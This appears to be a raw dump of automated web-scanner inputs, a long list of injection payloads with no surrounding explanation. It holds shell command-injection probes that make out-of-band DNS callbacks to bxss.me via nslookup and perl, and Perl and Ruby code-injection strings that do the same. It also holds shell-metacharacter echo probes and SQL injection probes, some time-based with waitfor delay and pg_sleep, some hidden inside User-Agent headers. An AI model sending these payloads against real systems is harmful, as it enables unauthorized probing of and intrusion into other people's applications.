+(nslookup hitmcshplbwmm3260c.bxss.me||perl -e "gethostbyname('hitmcshplbwmm3260c.bxss.me')")
+$(nslookup hithhrecrjtucc528b.bxss.me||perl -e "gethostbyname('hithhrecrjtucc528b.bxss.me')")
+&(nslookup hitlmfnlxuplj23d60.bxss.me||perl -e "gethostbyname('hitlmfnlxuplj23d60.bxss.me')")&'\"`0&(nslookup hitlmfnlxuplj23d60.bxss.me||perl -e "gethostbyname('hitlmfnlxuplj23d60.bxss.me')")&`'
+|(nslookup hitdxqcnbzqsbc0351.bxss.me||perl -e "gethostbyname('hitdxqcnbzqsbc0351.bxss.me')")
+${10000443 9999232}
+`(nslookup hitbuuecjbisw4d79e.bxss.me||perl -e "gethostbyname('hitbuuecjbisw4d79e.bxss.me')")`
+;(nslookup hitscwhlrifjb9345d.bxss.me||perl -e "gethostbyname('hitscwhlrifjb9345d.bxss.me')")|(nslookup hitscwhlrifjb9345d.bxss.me||perl -e "gethostbyname('hitscwhlrifjb9345d.bxss.me')")&(nslookup hitscwhlrifjb9345d.bxss.me||perl -e "gethostbyname('hitscwhlrifjb9345d.bxss.me')")
+'.gethostbyname(lc('hitea'.'cphzepwtc6466.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(106).chr(73).chr(106).chr(87).'
+".gethostbyname(lc("hituq"."qnnuoxhh55a87.bxss.me."))."A".chr(67).chr(hex("58")).chr(102).chr(67).chr(102).chr(76)."
+" "A".concat(70-3).concat(22*4).concat(107).concat(84).concat(122).concat(82) (require"socket" Socket.gethostbyname("hitzd" "dilrwsdb57275.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(113).concat(84).concat(110).concat(82) (require'socket' Socket.gethostbyname('hitib' 'mwdrcpdz6bcaf.bxss.me.')[3].to_s) '
+echo oeezyk$()\ gibhbd\nz^xyu||a #' &echo oeezyk$()\ gibhbd\nz^xyu||a #|" &echo oeezyk$()\ gibhbd\nz^xyu||a #
+&echo hvgbtp$()\ snnyro\nz^xyu||a #' &echo hvgbtp$()\ snnyro\nz^xyu||a #|" &echo hvgbtp$()\ snnyro\nz^xyu||a #
+|echo kzpqna$()\ vrzepi\nz^xyu||a #' |echo kzpqna$()\ vrzepi\nz^xyu||a #|" |echo kzpqna$()\ vrzepi\nz^xyu||a #
+(nslookup hituuhxxzrltod42ae.bxss.me||perl -e "gethostbyname('hituuhxxzrltod42ae.bxss.me')")
+$(nslookup hitdfgpkxwnjpac5ea.bxss.me||perl -e "gethostbyname('hitdfgpkxwnjpac5ea.bxss.me')")
+${9999337 9999968}
+&(nslookup hitfyroklilmlde2ba.bxss.me||perl -e "gethostbyname('hitfyroklilmlde2ba.bxss.me')")&'\"`0&(nslookup hitfyroklilmlde2ba.bxss.me||perl -e "gethostbyname('hitfyroklilmlde2ba.bxss.me')")&`'
+|(nslookup hitlhuggpklsj01bb1.bxss.me||perl -e "gethostbyname('hitlhuggpklsj01bb1.bxss.me')")
+`(nslookup hithpmjrvujht6295a.bxss.me||perl -e "gethostbyname('hithpmjrvujht6295a.bxss.me')")`
+;(nslookup hitudziggzslbf2a1d.bxss.me||perl -e "gethostbyname('hitudziggzslbf2a1d.bxss.me')")|(nslookup hitudziggzslbf2a1d.bxss.me||perl -e "gethostbyname('hitudziggzslbf2a1d.bxss.me')")&(nslookup hitudziggzslbf2a1d.bxss.me||perl -e "gethostbyname('hitudziggzslbf2a1d.bxss.me')")
+'.gethostbyname(lc('hityt'.'epuskqthe2f7a.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(109).chr(75).chr(107).chr(87).'
+".gethostbyname(lc("hitff"."vvhreedz2ca99.bxss.me."))."A".chr(67).chr(hex("58")).chr(107).chr(87).chr(106).chr(74)."
+" "A".concat(70-3).concat(22*4).concat(112).concat(80).concat(120).concat(85) (require"socket" Socket.gethostbyname("hitit" "bxaaeoof2cfa4.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(109).concat(85).concat(109).concat(80) (require'socket' Socket.gethostbyname('hitee' 'klqjfqur7b2c2.bxss.me.')[3].to_s) '
+${9999529 9999560}
+'.gethostbyname(lc('hitbm'.'zjdjqkmq150eb.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(102).chr(88).chr(106).chr(82).'
+echo qpcqku$()\ qgyobh\nz^xyu||a #' &echo qpcqku$()\ qgyobh\nz^xyu||a #|" &echo qpcqku$()\ qgyobh\nz^xyu||a #
+&echo ilcdhi$()\ esckth\nz^xyu||a #' &echo ilcdhi$()\ esckth\nz^xyu||a #|" &echo ilcdhi$()\ esckth\nz^xyu||a #
+".gethostbyname(lc("hitxt"."feqcblpq3b582.bxss.me."))."A".chr(67).chr(hex("58")).chr(107).chr(86).chr(121).chr(79)."
+" "A".concat(70-3).concat(22*4).concat(100).concat(80).concat(107).concat(70) (require"socket" Socket.gethostbyname("hitok" "xeveuiakbf685.bxss.me.")[3].to_s) "
+|echo pxlhmb$()\ eftrvw\nz^xyu||a #' |echo pxlhmb$()\ eftrvw\nz^xyu||a #|" |echo pxlhmb$()\ eftrvw\nz^xyu||a #
+' 'A'.concat(70-3).concat(22*4).concat(99).concat(67).concat(99).concat(82) (require'socket' Socket.gethostbyname('hitvm' 'ngicqynof1017.bxss.me.')[3].to_s) '
+(nslookup hithwbmpqmgtm2c380.bxss.me||perl -e "gethostbyname('hithwbmpqmgtm2c380.bxss.me')")
+$(nslookup hitephdcpbcfb7c856.bxss.me||perl -e "gethostbyname('hitephdcpbcfb7c856.bxss.me')")
+&(nslookup hitzsjenzqywt18220.bxss.me||perl -e "gethostbyname('hitzsjenzqywt18220.bxss.me')")&'\"`0&(nslookup hitzsjenzqywt18220.bxss.me||perl -e "gethostbyname('hitzsjenzqywt18220.bxss.me')")&`'
+|(nslookup hitvwspggarxaeb333.bxss.me||perl -e "gethostbyname('hitvwspggarxaeb333.bxss.me')")
+`(nslookup hithprsanupah874ad.bxss.me||perl -e "gethostbyname('hithprsanupah874ad.bxss.me')")`
+;(nslookup hitztyolamgnc29687.bxss.me||perl -e "gethostbyname('hitztyolamgnc29687.bxss.me')")|(nslookup hitztyolamgnc29687.bxss.me||perl -e "gethostbyname('hitztyolamgnc29687.bxss.me')")&(nslookup hitztyolamgnc29687.bxss.me||perl -e "gethostbyname('hitztyolamgnc29687.bxss.me')")
+1Bn22XHsnO
+${10000282 9999899}
+echo agenlx$()\ qkrkzo\nz^xyu||a #' &echo agenlx$()\ qkrkzo\nz^xyu||a #|" &echo agenlx$()\ qkrkzo\nz^xyu||a #
+&echo ysvrsx$()\ uixmus\nz^xyu||a #' &echo ysvrsx$()\ uixmus\nz^xyu||a #|" &echo ysvrsx$()\ uixmus\nz^xyu||a #
+|echo leojcy$()\ avxxbt\nz^xyu||a #' |echo leojcy$()\ avxxbt\nz^xyu||a #|" |echo leojcy$()\ avxxbt\nz^xyu||a #
+(nslookup hitjscskhvmyx1cedd.bxss.me||perl -e "gethostbyname('hitjscskhvmyx1cedd.bxss.me')")
+$(nslookup hitpxfijhwrvxb92b7.bxss.me||perl -e "gethostbyname('hitpxfijhwrvxb92b7.bxss.me')")
+&(nslookup hitgkdmaufkzg996fc.bxss.me||perl -e "gethostbyname('hitgkdmaufkzg996fc.bxss.me')")&'\"`0&(nslookup hitgkdmaufkzg996fc.bxss.me||perl -e "gethostbyname('hitgkdmaufkzg996fc.bxss.me')")&`'
+'.gethostbyname(lc('hitpj'.'feytqwum05076.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(117).chr(70).chr(98).chr(74).'
+|(nslookup hitchpibaltbj8579f.bxss.me||perl -e "gethostbyname('hitchpibaltbj8579f.bxss.me')")
+".gethostbyname(lc("hitke"."vgajtdja5d2d3.bxss.me."))."A".chr(67).chr(hex("58")).chr(117).chr(73).chr(118).chr(88)."
+`(nslookup hitincjdntxor5d491.bxss.me||perl -e "gethostbyname('hitincjdntxor5d491.bxss.me')")`
+;(nslookup hitkfrlvuhcfb081a5.bxss.me||perl -e "gethostbyname('hitkfrlvuhcfb081a5.bxss.me')")|(nslookup hitkfrlvuhcfb081a5.bxss.me||perl -e "gethostbyname('hitkfrlvuhcfb081a5.bxss.me')")&(nslookup hitkfrlvuhcfb081a5.bxss.me||perl -e "gethostbyname('hitkfrlvuhcfb081a5.bxss.me')")
+" "A".concat(70-3).concat(22*4).concat(118).concat(79).concat(116).concat(83) (require"socket" Socket.gethostbyname("hitdj" "cgolagggaef16.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(116).concat(89).concat(97).concat(71) (require'socket' Socket.gethostbyname('hitub' 'eweepxzo39329.bxss.me.')[3].to_s) '
+${10000272 10000477}
+echo qkeslg$()\ aacmdj\nz^xyu||a #' &echo qkeslg$()\ aacmdj\nz^xyu||a #|" &echo qkeslg$()\ aacmdj\nz^xyu||a #
+'.gethostbyname(lc('hitfn'.'wdabzver74603.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(121).chr(83).chr(121).chr(79).'
+&echo dpkecu$()\ fimqty\nz^xyu||a #' &echo dpkecu$()\ fimqty\nz^xyu||a #|" &echo dpkecu$()\ fimqty\nz^xyu||a #
+|echo dfuwoz$()\ jmnruk\nz^xyu||a #' |echo dfuwoz$()\ jmnruk\nz^xyu||a #|" |echo dfuwoz$()\ jmnruk\nz^xyu||a #
+".gethostbyname(lc("hitsl"."rmdqonefad509.bxss.me."))."A".chr(67).chr(hex("58")).chr(120).chr(70).chr(119).chr(84)."
+(nslookup hitwbbfjzdgej5322d.bxss.me||perl -e "gethostbyname('hitwbbfjzdgej5322d.bxss.me')")
+" "A".concat(70-3).concat(22*4).concat(102).concat(85).concat(101).concat(70) (require"socket" Socket.gethostbyname("hitgr" "npnoooii48868.bxss.me.")[3].to_s) "
+$(nslookup hitowxqkudgky61def.bxss.me||perl -e "gethostbyname('hitowxqkudgky61def.bxss.me')")
+' 'A'.concat(70-3).concat(22*4).concat(118).concat(72).concat(116).concat(76) (require'socket' Socket.gethostbyname('hitdv' 'kttywmwzd425f.bxss.me.')[3].to_s) '
+&(nslookup hitxsxbfwsich63f12.bxss.me||perl -e "gethostbyname('hitxsxbfwsich63f12.bxss.me')")&'\"`0&(nslookup hitxsxbfwsich63f12.bxss.me||perl -e "gethostbyname('hitxsxbfwsich63f12.bxss.me')")&`'
+|(nslookup hitopbfmzpvfyacca7.bxss.me||perl -e "gethostbyname('hitopbfmzpvfyacca7.bxss.me')")
+`(nslookup hityrejciputl80b53.bxss.me||perl -e "gethostbyname('hityrejciputl80b53.bxss.me')")`
+;(nslookup hitxgkkbmwcmo1990a.bxss.me||perl -e "gethostbyname('hitxgkkbmwcmo1990a.bxss.me')")|(nslookup hitxgkkbmwcmo1990a.bxss.me||perl -e "gethostbyname('hitxgkkbmwcmo1990a.bxss.me')")&(nslookup hitxgkkbmwcmo1990a.bxss.me||perl -e "gethostbyname('hitxgkkbmwcmo1990a.bxss.me')")
+1DdNsBRRoxO
+1TParY8GzO
+1DYSmksYnNO
+1DSL39IBs6O
+echo fbilji$()\ dnxnjn\nz^xyu||a #' &echo fbilji$()\ dnxnjn\nz^xyu||a #|" &echo fbilji$()\ dnxnjn\nz^xyu||a #
+&echo lsojmj$()\ ihdnnb\nz^xyu||a #' &echo lsojmj$()\ ihdnnb\nz^xyu||a #|" &echo lsojmj$()\ ihdnnb\nz^xyu||a #
+|echo hsvfai$()\ cwxzgv\nz^xyu||a #' |echo hsvfai$()\ cwxzgv\nz^xyu||a #|" |echo hsvfai$()\ cwxzgv\nz^xyu||a #
+(nslookup hitragpmaarqofe47a.bxss.me||perl -e "gethostbyname('hitragpmaarqofe47a.bxss.me')")
+$(nslookup hitmclxptvjyzbf01a.bxss.me||perl -e "gethostbyname('hitmclxptvjyzbf01a.bxss.me')")
+&(nslookup hitaslegfhnbg52e32.bxss.me||perl -e "gethostbyname('hitaslegfhnbg52e32.bxss.me')")&'\"`0&(nslookup hitaslegfhnbg52e32.bxss.me||perl -e "gethostbyname('hitaslegfhnbg52e32.bxss.me')")&`'
+|(nslookup hitfsvvqfiqbjac67c.bxss.me||perl -e "gethostbyname('hitfsvvqfiqbjac67c.bxss.me')")
+`(nslookup hitmlqfzjwgty5e1a0.bxss.me||perl -e "gethostbyname('hitmlqfzjwgty5e1a0.bxss.me')")`
+;(nslookup hityyxuqkqxfv7b45b.bxss.me||perl -e "gethostbyname('hityyxuqkqxfv7b45b.bxss.me')")|(nslookup hityyxuqkqxfv7b45b.bxss.me||perl -e "gethostbyname('hityyxuqkqxfv7b45b.bxss.me')")&(nslookup hityyxuqkqxfv7b45b.bxss.me||perl -e "gethostbyname('hityyxuqkqxfv7b45b.bxss.me')")
+${9999547 9999920}
+'.gethostbyname(lc('hitpd'.'qvnmmizx14723.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(118).chr(77).chr(114).chr(78).'
+".gethostbyname(lc("hitoc"."zfdamjvz85865.bxss.me."))."A".chr(67).chr(hex("58")).chr(101).chr(89).chr(121).chr(69)."
+" "A".concat(70-3).concat(22*4).concat(120).concat(72).concat(116).concat(79) (require"socket" Socket.gethostbyname("hitel" "fluvtwzm21efd.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(120).concat(69).concat(112).concat(65) (require'socket' Socket.gethostbyname('hitwx' 'pfrptfhv016eb.bxss.me.')[3].to_s) '
+echo hohuii$()\ ahdfgi\nz^xyu||a #' &echo hohuii$()\ ahdfgi\nz^xyu||a #|" &echo hohuii$()\ ahdfgi\nz^xyu||a #
+&echo dzadrd$()\ hquldt\nz^xyu||a #' &echo dzadrd$()\ hquldt\nz^xyu||a #|" &echo dzadrd$()\ hquldt\nz^xyu||a #
+|echo tjryzt$()\ plxoxi\nz^xyu||a #' |echo tjryzt$()\ plxoxi\nz^xyu||a #|" |echo tjryzt$()\ plxoxi\nz^xyu||a #
+(nslookup hityumioyevfw32057.bxss.me||perl -e "gethostbyname('hityumioyevfw32057.bxss.me')")
+$(nslookup hitlfuipfvgwhb55fe.bxss.me||perl -e "gethostbyname('hitlfuipfvgwhb55fe.bxss.me')")
+${9999662 9999747}
+&(nslookup hitdpxqmqgkcl17c35.bxss.me||perl -e "gethostbyname('hitdpxqmqgkcl17c35.bxss.me')")&'\"`0&(nslookup hitdpxqmqgkcl17c35.bxss.me||perl -e "gethostbyname('hitdpxqmqgkcl17c35.bxss.me')")&`'
+|(nslookup hitewonotiemcdeb77.bxss.me||perl -e "gethostbyname('hitewonotiemcdeb77.bxss.me')")
+`(nslookup hittkijfbyuje350ac.bxss.me||perl -e "gethostbyname('hittkijfbyuje350ac.bxss.me')")`
+;(nslookup hityjamcnyvaae407c.bxss.me||perl -e "gethostbyname('hityjamcnyvaae407c.bxss.me')")|(nslookup hityjamcnyvaae407c.bxss.me||perl -e "gethostbyname('hityjamcnyvaae407c.bxss.me')")&(nslookup hityjamcnyvaae407c.bxss.me||perl -e "gethostbyname('hityjamcnyvaae407c.bxss.me')")
+'.gethostbyname(lc('hitlu'.'wgynrrtxc11d0.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(103).chr(77).chr(106).chr(84).'
+".gethostbyname(lc("hitjz"."vgmgkggga678b.bxss.me."))."A".chr(67).chr(hex("58")).chr(100).chr(88).chr(105).chr(65)."
+-1 OR 2 370-370-1=0 0 0 1 --
+-1 OR 3 370-370-1=0 0 0 1 --
+-1 OR 3*2<(0 5 370-370) --
+-1 OR 2 166-166-1=0 0 0 1
+-1 OR 3 166-166-1=0 0 0 1
+-1' OR 2 216-216-1=0 0 0 1 --
+" "A".concat(70-3).concat(22*4).concat(117).concat(65).concat(109).concat(89) (require"socket" Socket.gethostbyname("hitid" "yuvzzpso3d7b2.bxss.me.")[3].to_s) "
+-1' OR 3 216-216-1=0 0 0 1 --
+' 'A'.concat(70-3).concat(22*4).concat(99).concat(66).concat(106).concat(89) (require'socket' Socket.gethostbyname('hitkt' 'somabchhec3fc.bxss.me.')[3].to_s) '
+AeLwCo5d
+-1 OR 2 521-521-1=0 0 0 1 --
+-1' OR 2 942-942-1=0 0 0 1 or 'hccp0ZQ5'='
+-1 OR 3 521-521-1=0 0 0 1 --
+-1' OR 3 942-942-1=0 0 0 1 or 'hccp0ZQ5'='
+-1 OR 3*2<(0 5 521-521) --
+-1" OR 2 373-373-1=0 0 0 1 --
+-1 OR 3*2>(0 5 521-521) --
+-1" OR 3 373-373-1=0 0 0 1 --
+32Jsugbv
+-1 OR 2 207-207-1=0 0 0 1
+adI31FBH
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*8 AND 'DuNd'='DuNd
+-1' OR 2 339-339-1=0 0 0 1 --
+onzMVZEB
+-1 OR 2 630-630-1=0 0 0 1 --
+-1' OR 2 422-422-1=0 0 0 1 or 'Pr5ATZM4'='
+-1 OR 2 650-650-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' AND 2*3*8=6*9 AND 'DuNd'='DuNd
+-1 OR 2 81-81-1=0 0 0 1
+-1' OR 2 206-206-1=0 0 0 1 --
+-1 OR 3 650-650-1=0 0 0 1 --
+-1" OR 2 56-56-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*8 AND "95hw"="95hw
+-1' OR 2 451-451-1=0 0 0 1 or 'P8o9C865'='
+-1 OR 3*2<(0 5 650-650) --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36" AND 2*3*8=6*9 AND "95hw"="95hw
+-1' OR 3 451-451-1=0 0 0 1 or 'P8o9C865'='
+-1 OR 3*2>(0 5 650-650) --
+-1' OR 3*2<(0 5 451-451) or 'P8o9C865'='
+-1 OR 2 425-425-1=0 0 0 1
+-1' OR 3*2>(0 5 451-451) or 'P8o9C865'='
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*8 AND '3X5B'!='3X5B%
+-1" OR 2 391-391-1=0 0 0 1 --
+-1' OR 2 561-561-1=0 0 0 1 --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 2*3*8=6*9 AND '3X5B'!='3X5B%
+-1" OR 3 391-391-1=0 0 0 1 --
+-1' OR 2 839-839-1=0 0 0 1 or 'ZOajXO2D'='
+-1" OR 3*2<(0 5 391-391) --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36%' AND 3*3<(2*4) AND '3X5B'!='3X5B%
+z2jNKFJL'; waitfor delay '0:0:15' --
+-1' OR 3 839-839-1=0 0 0 1 or 'ZOajXO2D'='
+-1 OR 2 400-400-1=0 0 0 1
+-1" OR 2 809-809-1=0 0 0 1 --
+-1 OR 3 400-400-1=0 0 0 1
+fpRFoJrn'); waitfor delay '0:0:15' --
+-1 OR 3*2<(0 5 400-400)
+-1 OR 3*2>(0 5 400-400)
+${10000180 10000474}
+G0IavTIY')); waitfor delay '0:0:15' --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (776=776) THEN 1 ELSE 0x28 END)) --
+echo byaadj$()\ lczkth\nz^xyu||a #' &echo byaadj$()\ lczkth\nz^xyu||a #|" &echo byaadj$()\ lczkth\nz^xyu||a #
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (776=0*776) THEN 1 ELSE 0x28 END)) --
+vv75BxI5'; waitfor delay '0:0:15' --
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (776=1*776) THEN 1 ELSE 0x28 END)) --
+&echo jmsiae$()\ msaxuh\nz^xyu||a #' &echo jmsiae$()\ msaxuh\nz^xyu||a #|" &echo jmsiae$()\ msaxuh\nz^xyu||a #
+|echo dwztuu$()\ nuajfw\nz^xyu||a #' |echo dwztuu$()\ nuajfw\nz^xyu||a #|" |echo dwztuu$()\ nuajfw\nz^xyu||a #
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (0*776=0*776) THEN 1 ELSE 0x28 END)) --
+(nslookup hitsitkvcuapsa4a35.bxss.me||perl -e "gethostbyname('hitsitkvcuapsa4a35.bxss.me')")
+l9dAlrkw' OR 867=(SELECT 867 FROM PG_SLEEP(15))--
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36' RLIKE (SELECT (CASE WHEN (0*776=1*776) THEN 1 ELSE 0x28 END)) --
+Zwe3i0Jj'); waitfor delay '0:0:15' --
+$(nslookup hitekbvnmgndkbd9d5.bxss.me||perl -e "gethostbyname('hitekbvnmgndkbd9d5.bxss.me')")
+&(nslookup hitkbspasnzet98e93.bxss.me||perl -e "gethostbyname('hitkbspasnzet98e93.bxss.me')")&'\"`0&(nslookup hitkbspasnzet98e93.bxss.me||perl -e "gethostbyname('hitkbspasnzet98e93.bxss.me')")&`'
+|(nslookup hitczpqsamfjwb00ae.bxss.me||perl -e "gethostbyname('hitczpqsamfjwb00ae.bxss.me')")
+`(nslookup hitwjmfovmcjn7c07d.bxss.me||perl -e "gethostbyname('hitwjmfovmcjn7c07d.bxss.me')")`
+NfFTOaXb') OR 892=(SELECT 892 FROM PG_SLEEP(15))--
+fHdM5osG')); waitfor delay '0:0:15' --
+;(nslookup hitbrknkqpdoh159f7.bxss.me||perl -e "gethostbyname('hitbrknkqpdoh159f7.bxss.me')")|(nslookup hitbrknkqpdoh159f7.bxss.me||perl -e "gethostbyname('hitbrknkqpdoh159f7.bxss.me')")&(nslookup hitbrknkqpdoh159f7.bxss.me||perl -e "gethostbyname('hitbrknkqpdoh159f7.bxss.me')")
+'.gethostbyname(lc('hitdh'.'ykraqkkbd3211.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(120).chr(86).chr(108).chr(87).'
+pvSHeTda')) OR 173=(SELECT 173 FROM PG_SLEEP(15))--
+".gethostbyname(lc("hitum"."hdyzadhp812b6.bxss.me."))."A".chr(67).chr(hex("58")).chr(113).chr(71).chr(119).chr(78)."
+tQ2SY8vD' OR 587=(SELECT 587 FROM PG_SLEEP(15))--
+02lSntzr'; waitfor delay '0:0:15' --
+Mk3WGgCl') OR 255=(SELECT 255 FROM PG_SLEEP(15))--
+RexTOk8f'; waitfor delay '0:0:15' --
+seEPHtmK'); waitfor delay '0:0:15' --
+@@BEPI2
+IoVgjVds')) OR 652=(SELECT 652 FROM PG_SLEEP(15))--
+h4aao2mO'); waitfor delay '0:0:15' --
+8hPpdsMC')); waitfor delay '0:0:15' --
+" "A".concat(70-3).concat(22*4).concat(122).concat(71).concat(114).concat(77) (require"socket" Socket.gethostbyname("hitdn" "ebexasvu98ded.bxss.me.")[3].to_s) "
+KNPlbPrY')); waitfor delay '0:0:15' --
+UqbM8nOH' OR 204=(SELECT 204 FROM PG_SLEEP(15))--
+@@WZ8TQ
+' 'A'.concat(70-3).concat(22*4).concat(111).concat(76).concat(100).concat(87) (require'socket' Socket.gethostbyname('hiter' 'knfljfxb55e12.bxss.me.')[3].to_s) '
+B4e8s5rh' OR 226=(SELECT 226 FROM PG_SLEEP(15))--
+zQnCwRZB') OR 992=(SELECT 992 FROM PG_SLEEP(15))--
+zjU3Eseu'; waitfor delay '0:0:15' --
+kIfPN5XJ') OR 122=(SELECT 122 FROM PG_SLEEP(15))--
+kIXpdlex')) OR 223=(SELECT 223 FROM PG_SLEEP(15))--
+mDrZ2lqz'); waitfor delay '0:0:15' --
+dL1c3ZeP')) OR 561=(SELECT 561 FROM PG_SLEEP(15))--
+hmpAyHaD')); waitfor delay '0:0:15' --
+@@Dy8uD
+B4hIIiDU' OR 727=(SELECT 727 FROM PG_SLEEP(15))--
+@@NA9eP
+dL5vxq8g') OR 769=(SELECT 769 FROM PG_SLEEP(15))--
+echo yfkurm$()\ xttxhm\nz^xyu||a #' &echo yfkurm$()\ xttxhm\nz^xyu||a #|" &echo yfkurm$()\ xttxhm\nz^xyu||a #
+&echo kpavod$()\ mjdite\nz^xyu||a #' &echo kpavod$()\ mjdite\nz^xyu||a #|" &echo kpavod$()\ mjdite\nz^xyu||a #
+qtlbGaR5')) OR 114=(SELECT 114 FROM PG_SLEEP(15))--
+|echo xthhww$()\ byfjjd\nz^xyu||a #' |echo xthhww$()\ byfjjd\nz^xyu||a #|" |echo xthhww$()\ byfjjd\nz^xyu||a #
+${10000061 10000161}
+(nslookup hituqvyecuxtdf363c.bxss.me||perl -e "gethostbyname('hituqvyecuxtdf363c.bxss.me')")
+$(nslookup hitwuvqtfozxqa4253.bxss.me||perl -e "gethostbyname('hitwuvqtfozxqa4253.bxss.me')")
+&(nslookup hitidvfnltigg81363.bxss.me||perl -e "gethostbyname('hitidvfnltigg81363.bxss.me')")&'\"`0&(nslookup hitidvfnltigg81363.bxss.me||perl -e "gethostbyname('hitidvfnltigg81363.bxss.me')")&`'
+|(nslookup hithhcmvlmdftc365b.bxss.me||perl -e "gethostbyname('hithhcmvlmdftc365b.bxss.me')")
+`(nslookup hitspmheixdoc96a22.bxss.me||perl -e "gethostbyname('hitspmheixdoc96a22.bxss.me')")`
+;(nslookup hitgwuaziukwbbacf2.bxss.me||perl -e "gethostbyname('hitgwuaziukwbbacf2.bxss.me')")|(nslookup hitgwuaziukwbbacf2.bxss.me||perl -e "gethostbyname('hitgwuaziukwbbacf2.bxss.me')")&(nslookup hitgwuaziukwbbacf2.bxss.me||perl -e "gethostbyname('hitgwuaziukwbbacf2.bxss.me')")
+@@n1ZQq
+'.gethostbyname(lc('hitce'.'ujamlpgn77c38.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(117).chr(70).chr(110).chr(86).'
+".gethostbyname(lc("hitiw"."xngdtead076bc.bxss.me."))."A".chr(67).chr(hex("58")).chr(119).chr(85).chr(119).chr(67)."
+" "A".concat(70-3).concat(22*4).concat(103).concat(84).concat(105).concat(78) (require"socket" Socket.gethostbyname("hitsm" "lwizbrlt7c78e.bxss.me.")[3].to_s) "
+' 'A'.concat(70-3).concat(22*4).concat(100).concat(74).concat(113).concat(88) (require'socket' Socket.gethostbyname('hitvz' 'ljeynwnnaba6e.bxss.me.')[3].to_s) '
+1BQ9IZIItlO
+1BxEfhZ9zgO
+1BFG8mS4hVO
+18iQS8N06O
+echo doxgiw$()\ nfnuyj\nz^xyu||a #' &echo doxgiw$()\ nfnuyj\nz^xyu||a #|" &echo doxgiw$()\ nfnuyj\nz^xyu||a #
+&echo hpwluz$()\ xsgeid\nz^xyu||a #' &echo hpwluz$()\ xsgeid\nz^xyu||a #|" &echo hpwluz$()\ xsgeid\nz^xyu||a #
+|echo mjvduy$()\ uzsdyc\nz^xyu||a #' |echo mjvduy$()\ uzsdyc\nz^xyu||a #|" |echo mjvduy$()\ uzsdyc\nz^xyu||a #
+(nslookup hitrtexwkjrrw00ffc.bxss.me||perl -e "gethostbyname('hitrtexwkjrrw00ffc.bxss.me')")
+$(nslookup hitxzqpzvzsbv93180.bxss.me||perl -e "gethostbyname('hitxzqpzvzsbv93180.bxss.me')")
+&(nslookup hitkqpgsifrsq48d25.bxss.me||perl -e "gethostbyname('hitkqpgsifrsq48d25.bxss.me')")&'\"`0&(nslookup hitkqpgsifrsq48d25.bxss.me||perl -e "gethostbyname('hitkqpgsifrsq48d25.bxss.me')")&`'
+|(nslookup hitzlmhxwgamr28113.bxss.me||perl -e "gethostbyname('hitzlmhxwgamr28113.bxss.me')")
+`(nslookup hitvshovfkugxfd164.bxss.me||perl -e "gethostbyname('hitvshovfkugxfd164.bxss.me')")`
+;(nslookup hitewixrtyzik89d8d.bxss.me||perl -e "gethostbyname('hitewixrtyzik89d8d.bxss.me')")|(nslookup hitewixrtyzik89d8d.bxss.me||perl -e "gethostbyname('hitewixrtyzik89d8d.bxss.me')")&(nslookup hitewixrtyzik89d8d.bxss.me||perl -e "gethostbyname('hitewixrtyzik89d8d.bxss.me')")
+${9999821 9999037}
+'.gethostbyname(lc('hitxk'.'rvbtcqvx4e71f.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(115).chr(77).chr(102).chr(70).'
+".gethostbyname(lc("hitrm"."vtqxaudq174c8.bxss.me."))."A".chr(67).chr(hex("58")).chr(107).chr(77).chr(111).chr(85)."
+xAm0FnxY
+-1 OR 2 226-226-1=0 0 0 1 --
+-1 OR 2 234-234-1=0 0 0 1
+-1' OR 2 470-470-1=0 0 0 1 --
+cGdAQc5y
+-1 OR 2 900-900-1=0 0 0 1 --
+-1' OR 2 52-52-1=0 0 0 1 or '7bVAFRZH'='
+-1 OR 2 824-824-1=0 0 0 1
+-1' OR 2 269-269-1=0 0 0 1 --
+-1' OR 2 918-918-1=0 0 0 1 or 'qog05wSv'='
+-1" OR 2 240-240-1=0 0 0 1 --
